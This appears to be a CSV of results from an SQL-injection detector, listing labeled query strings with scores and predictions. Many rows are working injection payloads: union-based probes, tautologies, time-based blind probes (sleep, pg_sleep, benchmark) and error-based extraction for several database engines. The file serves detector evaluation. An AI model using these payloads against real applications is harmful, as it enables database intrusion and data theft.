Query,Label,RawMargin,Prob_Raw,Pred_Default,Pred_BestThr,BestThr,BestThr_Margin
"INSERT INTO giving  ( rod, simplest, dot )  VALUES  ( 'court', 'badly', 'plain' )  ",0,-10.01671028137207,4.464559242478572e-05,0,0,0.51,0.040005334613699206
1'||  (  select 'kyhs' from dual where 9491  =  9491,1,10.862406730651855,0.9999808073043823,1,1,0.51,0.040005334613699206
SELECT * FROM club FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rocket,0,-13.063448905944824,2.121364559570793e-06,0,0,0.51,0.040005334613699206
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",1,11.53483772277832,0.9999902248382568,1,1,0.51,0.040005334613699206
8.2197E+15,0,-8.372413635253906,0.00023110353504307568,0,0,0.51,0.040005334613699206
1'  ) ,1,10.780174255371094,0.9999791383743286,1,1,0.51,0.040005334613699206
SELECT * FROM yellow WHERE fill BETWEEN neighborhood09/01/1996free AND than15/31/1996they,0,-13.133065223693848,1.9787064502452267e-06,0,0,0.51,0.040005334613699206
SELECT * FROM guess WHERE reach BETWEEN '1996-07-01' AND '1996-07-31',0,-9.468057632446289,7.72753992350772e-05,0,0,0.51,0.040005334613699206
"-5082   )    )    union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",1,13.61689567565918,0.9999988079071045,1,1,0.51,0.040005334613699206
de78e24423n6e,0,-8.507309913635254,0.00020194565877318382,0,0,0.51,0.040005334613699206
SELECT quite ( s )  FROM tip UNION,0,-8.677221298217773,0.00017039492377080023,0,0,0.51,0.040005334613699206
-4828%'  )   or 8678  =  5745#,1,12.646202087402344,0.9999967813491821,1,1,0.51,0.040005334613699206
"logroo, 98, 5-d",0,-4.871746063232422,0.0076017496176064014,0,0,0.51,0.040005334613699206
"1  )   and elt  (  7425  =  8842,8842  )   and   (  9194  =  9194",1,11.698594093322754,0.9999916553497314,1,1,0.51,0.040005334613699206
"1""   )    )     )   union all select null,null,null,null,null,null,null#",1,7.428933620452881,0.9994065761566162,1,1,0.51,0.040005334613699206
SELECT * FROM neck WHERE properly = 'struck' LIMIT 3,0,-10.123811721801758,4.011132841696963e-05,0,0,0.51,0.040005334613699206
SELECT * FROM coal WHERE foot = 'above' FETCH FIRST 3 ROWS ONLY,0,-14.587090492248535,4.6228188921304536e-07,0,0,0.51,0.040005334613699206
"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,11.381525993347168,0.9999885559082031,1,1,0.51,0.040005334613699206
" select * from users where id  =  '1' or \<\. union select 1,@@VERSION -- 1'",1,8.657245635986328,0.9998262524604797,1,1,0.51,0.040005334613699206
"1  )   as cfnz where 6065  =  6065 union all select null,null,null,null,null,null,null,null,null#",1,8.024728775024414,0.9996728897094727,1,1,0.51,0.040005334613699206
""" or """" """,1,8.528254508972168,0.99980229139328,1,1,0.51,0.040005334613699206
dra2atizar,0,-8.40040111541748,0.00022472662385553122,0,0,0.51,0.040005334613699206
6.02828E+15,0,-8.801640510559082,0.00015046335465740412,0,0,0.51,0.040005334613699206
SELECT * FROM individual WHERE situation NOT LIKE 'ship%',0,-13.722860336303711,1.0970768471452175e-06,0,0,0.51,0.040005334613699206
"1%'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  '%'  =  '",1,11.507237434387207,0.9999899864196777,1,1,0.51,0.040005334613699206
SELECT stomach ( s )  FROM attached SELECT supply ( s ) ,0,-11.080732345581055,1.540608900540974e-05,0,0,0.51,0.040005334613699206
SELECT * FROM bat  WHERE built = few,0,-10.932170867919922,1.787354631233029e-05,0,0,0.51,0.040005334613699206
admin' or '1'  =  '1,1,7.578038215637207,0.9994887113571167,1,1,0.51,0.040005334613699206
SELECT COUNT ( DISTINCT grown )  FROM until,0,-10.22170352935791,3.637095869635232e-05,0,0,0.51,0.040005334613699206
SELECT * FROM  ( SELECT leather FROM drive ) ,0,-12.70974063873291,3.0215408060030313e-06,0,0,0.51,0.040005334613699206
1  )   as ilqx where 8547  =  8547,1,6.757795810699463,0.9988395571708679,1,1,0.51,0.040005334613699206
SELECT * FROM but WHERE plastic NOT LIKE '[market]%',0,-8.366739273071289,0.00023241831513587385,0,0,0.51,0.040005334613699206
"-2821""   )    )     )   union all select 3920,3920,3920,3920,3920,3920,3920#",1,12.594535827636719,0.9999966621398926,1,1,0.51,0.040005334613699206
"  SELECT scaredID AS ID, jungle AS rice FROM carefully",0,-14.330543518066406,5.974805503683456e-07,0,0,0.51,0.040005334613699206
"-2916""   )    )    or 4946  =  8232--",1,12.889300346374512,0.9999974966049194,1,1,0.51,0.040005334613699206
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",1,11.385555267333984,0.9999886751174927,1,1,0.51,0.040005334613699206
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'gtov' like 'gtov",1,12.586150169372559,0.999996542930603,1,1,0.51,0.040005334613699206
3o7za732,0,-8.583373069763184,0.00018715744954533875,0,0,0.51,0.040005334613699206
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,9.235363960266113,0.9999024868011475,1,1,0.51,0.040005334613699206
SELECT TOP 3 * FROM certainly,0,-10.697954177856445,2.25905987463193e-05,0,0,0.51,0.040005334613699206
DELETE FROM difference,0,-10.124031066894531,4.010252814623527e-05,0,0,0.51,0.040005334613699206
SELECT baseball ( s )  FROM consist FULL OUTER JOIN,0,-11.780823707580566,7.649798135389574e-06,0,0,0.51,0.040005334613699206
acr7m6nia,0,-7.884129524230957,0.00037653252365998924,0,0,0.51,0.040005334613699206
SELECT * FROM around FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM certainly,0,-12.442996978759766,3.945239313907223e-06,0,0,0.51,0.040005334613699206
select case when 6555  =  7349 then 1 else null end--,1,7.943953037261963,0.9996453523635864,1,1,0.51,0.040005334613699206
-5764 or 3038  =  3038,1,8.390583992004395,0.9997730851173401,1,1,0.51,0.040005334613699206
" SELECT * FROM being ORDER BY said ASC, coal DESC",0,-9.74756145477295,5.843357212143019e-05,0,0,0.51,0.040005334613699206
SELECT COUNT ( birds ) FROM wish,0,-10.424123764038086,2.9706239729421213e-05,0,0,0.51,0.040005334613699206
SELECT * FROM let,0,-5.866944789886475,0.0028235160280019045,0,0,0.51,0.040005334613699206
7118,0,-7.338615894317627,0.0006495273555628955,0,0,0.51,0.040005334613699206
SELECT * FROM single,0,-15.202658653259277,2.497866091744072e-07,0,0,0.51,0.040005334613699206
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  -- ofqd",1,8.827343940734863,0.9998533725738525,1,1,0.51,0.040005334613699206
"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",1,13.17587661743164,0.9999980926513672,1,1,0.51,0.040005334613699206
"  SELECT REPEAT ( ""SQL Tutorial"", 3 ) ;",0,-5.484172344207764,0.004134802613407373,0,0,0.51,0.040005334613699206
7.85716E+15,0,-8.801640510559082,0.00015046335465740412,0,0,0.51,0.040005334613699206
SELECT * FROM kept WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',0,-9.645548820495605,6.470879452535883e-05,0,0,0.51,0.040005334613699206
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",1,13.712896347045898,0.999998927116394,1,1,0.51,0.040005334613699206
"1%""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""%""  =  """,1,11.759476661682129,0.9999921321868896,1,1,0.51,0.040005334613699206
lagunaseca,0,-8.482161521911621,0.0002070876071229577,0,0,0.51,0.040005334613699206
"1%' union all select null,null,null,null,null,null,null,null--",1,8.184253692626953,0.9997209906578064,1,1,0.51,0.040005334613699206
poma gozalbo,0,-7.123929023742676,0.000804946874268353,0,0,0.51,0.040005334613699206
 (  1589  =  1589  )  *1,1,10.200139045715332,0.9999628067016602,1,1,0.51,0.040005334613699206
1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1,10.972458839416504,0.9999828338623047,1,1,0.51,0.040005334613699206
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 29420 )  ORDER BY meta_id ASC",0,-7.786021709442139,0.00041533002513460815,0,0,0.51,0.040005334613699206
-2039'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,10.332799911499023,0.9999674558639526,1,1,0.51,0.040005334613699206
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 5940 )  ORDER BY meta_id ASC",0,-7.786021709442139,0.00041533002513460815,0,0,0.51,0.040005334613699206
"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",1,9.366815567016602,0.9999145269393921,1,1,0.51,0.040005334613699206
woolgar@awat.gov,0,-5.346325874328613,0.0047430251725018024,0,0,0.51,0.040005334613699206
SELECT * FROM thy,0,-5.866944789886475,0.0028235160280019045,0,0,0.51,0.040005334613699206
"   SELECT Employees.one, COUNT ( Orders.wolfID )  AS signFROM    ( OrdersINNER JOIN tent ON Orders.exampleID  =  Employees.lastID ) ",0,-10.968742370605469,1.723170316836331e-05,0,0,0.51,0.040005334613699206
fest lairigoyen,0,-9.023820877075195,0.00012049029464833438,0,0,0.51,0.040005334613699206
-6145 or   (  8459  =  8459  )  *4906-- yklv,1,12.556944847106934,0.9999964237213135,1,1,0.51,0.040005334613699206
vasilescu.lisi@drogasvirtuales.sc,0,-8.918493270874023,0.0001338719011982903,0,0,0.51,0.040005334613699206
SELECT * FROM simply WHERE hurried NOT LIKE 'alphabet%',0,-13.755229949951172,1.0621333785820752e-06,0,0,0.51,0.040005334613699206
SELECT * FROM glass FETCH FIRST 3 ROWS ONLY,0,-12.939401626586914,2.4015312192204874e-06,0,0,0.51,0.040005334613699206
1 where 5700  =  5700,1,6.447958469390869,0.9984188079833984,1,1,0.51,0.040005334613699206
02314635f,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1,8.964242935180664,0.999872088432312,1,1,0.51,0.040005334613699206
"-7916'   )    )    union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",1,13.927180290222168,0.9999990463256836,1,1,0.51,0.040005334613699206
"  SELECT * FROM glass WHERE topic NOT IN  ( 'tell', 'mouth', 'typical' )  ",0,-12.700428009033203,3.0498106298182392e-06,0,0,0.51,0.040005334613699206
"1"" and elt  (  2373  =  5817,5817  )   and ""rsdt""  =  ""rsdt",1,9.532894134521484,0.9999275207519531,1,1,0.51,0.040005334613699206
"1""  )   as crek where 6570  =  6570 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,10.4337739944458,0.999970555305481,1,1,0.51,0.040005334613699206
-1217'   )    )     )   order by 1#,1,11.462079048156738,0.9999895095825195,1,1,0.51,0.040005334613699206
SELECT * FROM rate WHERE same BETWEEN 'two' AND 'congress',0,-13.68980884552002,1.1339426464473945e-06,0,0,0.51,0.040005334613699206
FROM  ( SELECT DISTINCT tongue FROM settle ) ,0,-10.649020195007324,2.3723512640572153e-05,0,0,0.51,0.040005334613699206
SELECT * FROM kept WHERE also NOT LIKE '[primitive]%',0,-10.169604301452637,3.8316014979500324e-05,0,0,0.51,0.040005334613699206
rapetto picabea,0,-9.023820877075195,0.00012049029464833438,0,0,0.51,0.040005334613699206
SELECT * FROM giant FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM sure,0,-12.401593208312988,4.112015176360728e-06,0,0,0.51,0.040005334613699206
albertini_trauberg@theroxyblue.jo,0,-7.718914031982422,0.00044414549483917654,0,0,0.51,0.040005334613699206
"-1512 union all select 9013,9013,9013,9013#",1,12.315646171569824,0.9999954700469971,1,1,0.51,0.040005334613699206
ren,0,-2.9969239234924316,0.0475650317966938,0,0,0.51,0.040005334613699206
m9gnificen5i5,0,-7.229371547698975,0.0007244511507451534,0,0,0.51,0.040005334613699206
hole@chicashumedas.at,0,-9.032224655151367,0.00011948209430556744,0,0,0.51,0.040005334613699206
1  )   where 6116  =  6116 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,9.934144973754883,0.9999514818191528,1,1,0.51,0.040005334613699206
calle benifallim 97 10?e,0,-11.41010856628418,1.1082761375291739e-05,0,0,0.51,0.040005334613699206
"  SELECT MAKEDATE ( 2017, 3 ) ;",0,-6.656875133514404,0.0012835065135732293,0,0,0.51,0.040005334613699206
"  SELECT Orders.againrID, Employees.might, Employees.religious FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fightID ORDER BY Orders.structureID",0,-10.218828201293945,3.647568519227207e-05,0,0,0.51,0.040005334613699206
mcanally@rockefeller.bt,0,-9.534907341003418,7.227880996651947e-05,0,0,0.51,0.040005334613699206
12230,0,-7.913724422454834,0.00036555639235302806,0,0,0.51,0.040005334613699206
cea,0,-2.9969239234924316,0.0475650317966938,0,0,0.51,0.040005334613699206
SELECT * FROM slowly,0,-15.202658653259277,2.497866091744072e-07,0,0,0.51,0.040005334613699206
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lvck'  =  'lvck",1,8.154521942138672,0.9997126460075378,1,1,0.51,0.040005334613699206
"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,5.117789268493652,0.9940464496612549,1,1,0.51,0.040005334613699206
"calle artigako haritza, s/n 8?d",0,-9.656477928161621,6.400547863449901e-05,0,0,0.51,0.040005334613699206
seno,0,-4.758330821990967,0.008506929501891136,0,0,0.51,0.040005334613699206
DELETE FROM would WHERE officer = 'lying',0,-8.599891662597656,0.0001840918412199244,0,0,0.51,0.040005334613699206
SELECT COUNT ( especially )  FROM nodded,0,-10.576210975646973,2.5515191737213172e-05,0,0,0.51,0.040005334613699206
"calle puebla de los infantes, 145",0,-10.737457275390625,2.171561573049985e-05,0,0,0.51,0.040005334613699206
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82f1dbb24' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,-7.902416229248047,0.0003697120992001146,0,0,0.51,0.040005334613699206
ag-uzadura,0,-8.42245101928711,0.00021982674661558121,0,0,0.51,0.040005334613699206
5140,0,-1.731327772140503,0.15041783452033997,0,0,0.51,0.040005334613699206
"   SELECT rapidly, carefully, voyage FROM simply WHERE seems  IS NULL",0,-12.444117546081543,3.94082098864601e-06,0,0,0.51,0.040005334613699206
"iif  (  9190  =  5059,1,1/0  )  ",1,6.247678279876709,0.9980688691139221,1,1,0.51,0.040005334613699206
SELECT Count ( * )  AS fur,0,-9.38265323638916,8.416450145887211e-05,0,0,0.51,0.040005334613699206
SELECT COUNT ( map ) FROM buy,0,-11.338447570800781,1.1906101462955121e-05,0,0,0.51,0.040005334613699206
llanes,0,-4.914506912231445,0.007285862695425749,0,0,0.51,0.040005334613699206
"  SELECT are AS rod, fence AS [worker]  FROM swung",0,-6.365179538726807,0.0017174776876345277,0,0,0.51,0.040005334613699206
SELECT * FROM hand WHERE fire BETWEEN motor09/01/1996yesterday AND policeman15/31/1996industrial,0,-11.90546703338623,6.7533374021877535e-06,0,0,0.51,0.040005334613699206
1 and 4595  =  4595#,1,9.90567684173584,0.9999500513076782,1,1,0.51,0.040005334613699206
1' where 8159  =  8159 union all select null#,1,12.468119621276855,0.9999961853027344,1,1,0.51,0.040005334613699206
SELECT AVG ( Price ) FROM cap,0,-11.338447570800781,1.1906101462955121e-05,0,0,0.51,0.040005334613699206
"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",1,14.13796329498291,0.9999992847442627,1,1,0.51,0.040005334613699206
1'  )   where 9516  =  9516,1,11.131868362426758,0.9999853372573853,1,1,0.51,0.040005334613699206
SELECT * FROM order WHERE but = 'piano' LIMIT 3,0,-8.935591697692871,0.00013160267553757876,0,0,0.51,0.040005334613699206
SELECT * FROM essential,0,-14.373936653137207,5.721084903598239e-07,0,0,0.51,0.040005334613699206
"  SELECT * FROM planning WHERE loud IN  ( 'under', 'way', 'imagine' )  ",0,-13.252906799316406,1.7552337112647365e-06,0,0,0.51,0.040005334613699206
"  SELECT fall,empty FROM language WHERE darkness = 'distant' UNION SELECT way, never FROM made",0,-9.162066459655762,0.00010493479203432798,0,0,0.51,0.040005334613699206
"-8838""   )    )    as xisn where 2749  =  2749 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,10.943331718444824,0.9999823570251465,1,1,0.51,0.040005334613699206
tsoucas,0,-5.43983793258667,0.0043214308097958565,0,0,0.51,0.040005334613699206
"  SELECT * FROM mean WHERE zipper IN  ( 'herd', 'prove', 'valley' )  ",0,-13.252906799316406,1.7552337112647365e-06,0,0,0.51,0.040005334613699206
SELECT COUNT ( due ) FROM finger,0,-10.424123764038086,2.9706239729421213e-05,0,0,0.51,0.040005334613699206
56597686e,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,9.260584831237793,0.9999048709869385,1,1,0.51,0.040005334613699206
8.42194E+15,0,-8.801640510559082,0.00015046335465740412,0,0,0.51,0.040005334613699206
SELECT * FROM  ( SELECT gift FROM behind ) ,0,-13.06068229675293,2.1272417143336497e-06,0,0,0.51,0.040005334613699206
"  SELECT * FROM private WHERE cast NOT IN  ( 'those', 'roar', 'crowd' )  ",0,-12.700428009033203,3.0498106298182392e-06,0,0,0.51,0.040005334613699206
SELECT * FROM program WHERE Price NOT BETWEEN 10 AND 20,0,-14.044571876525879,7.952790497256501e-07,0,0,0.51,0.040005334613699206
"   SELECT COUNT ( favorite ) , automobile FROM blow BY bring",0,-11.415193557739258,1.1026549145753961e-05,0,0,0.51,0.040005334613699206
3040,0,-3.932011365890503,0.019227266311645508,0,0,0.51,0.040005334613699206
48di48l92,0,-8.830307006835938,0.00014621196896769106,0,0,0.51,0.040005334613699206
mara,0,-4.758330821990967,0.008506929501891136,0,0,0.51,0.040005334613699206
jarad,0,-4.80619478225708,0.008112571202218533,0,0,0.51,0.040005334613699206
-5861'  )   or 1581  =  2611 and   (  'mvjh' like 'mvjh,1,11.090594291687012,0.9999847412109375,1,1,0.51,0.040005334613699206
19127,0,-7.913724422454834,0.00036555639235302806,0,0,0.51,0.040005334613699206
-9668'   )    )    as orfu where 5822  =  5822 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,10.350452423095703,0.9999680519104004,1,1,0.51,0.040005334613699206
80,0,-7.042815685272217,0.0008729004766792059,0,0,0.51,0.040005334613699206
SELECT * FROM forgotten  WHERE needs NOT LIKE '[creature]%',0,-12.794384002685547,2.776313294816646e-06,0,0,0.51,0.040005334613699206
SELECT * FROM charge WHERE vessels BETWEEN property09/01/1996hearing AND coffee15/31/1996year,0,-13.657387733459473,1.1713086678355467e-06,0,0,0.51,0.040005334613699206
vildo@prensahp.fj,0,-7.6011433601379395,0.0004996297648176551,0,0,0.51,0.040005334613699206
1%'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,15.355260848999023,0.9999997615814209,1,1,0.51,0.040005334613699206
"1'+  (  select 'asdq' where 4023  =  4023 and make_set  (  8403  =  8403,8899   )    )   +'",1,13.265869140625,0.9999982118606567,1,1,0.51,0.040005334613699206
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,1,9.170745849609375,0.9998959302902222,1,1,0.51,0.040005334613699206
select * from users where id  =  1 <@1$ or 1  =  1 -- 1,1,10.066493034362793,0.9999575614929199,1,1,0.51,0.040005334613699206
"-9634'   )    )     )   union all select 4141,4141#",1,13.75960636138916,0.999998927116394,1,1,0.51,0.040005334613699206
" select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",1,7.854916572570801,0.9996123909950256,1,1,0.51,0.040005334613699206
couri-manahan@copiar.com.fm,0,-9.864557266235352,5.198219514568336e-05,0,0,0.51,0.040005334613699206
SELECT * FROM limited,0,-13.89354419708252,9.249324648408219e-07,0,0,0.51,0.040005334613699206
"  SELECT circleID AS ID, stove AS headed FROM thing",0,-14.153285026550293,7.133556323424273e-07,0,0,0.51,0.040005334613699206
"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",1,14.20305061340332,0.9999992847442627,1,1,0.51,0.040005334613699206
" SELECT * FROM machine ORDER BY range, eight",0,-11.455102920532227,1.0595157618809026e-05,0,0,0.51,0.040005334613699206
levi@coivoco.gr,0,-3.7493646144866943,0.022991638630628586,0,0,0.51,0.040005334613699206
DELETE FROM yes WHERE sheep = 'porch',0,-7.550548076629639,0.0005255455034784973,0,0,0.51,0.040005334613699206
SELECT * FROM color,0,-14.802302360534668,3.7277052911122155e-07,0,0,0.51,0.040005334613699206
padiernos,0,-5.873077392578125,0.002806302160024643,0,0,0.51,0.040005334613699206
1;SELECT *,1,-8.8394136428833,0.000144886682392098,0,0,0.51,0.040005334613699206
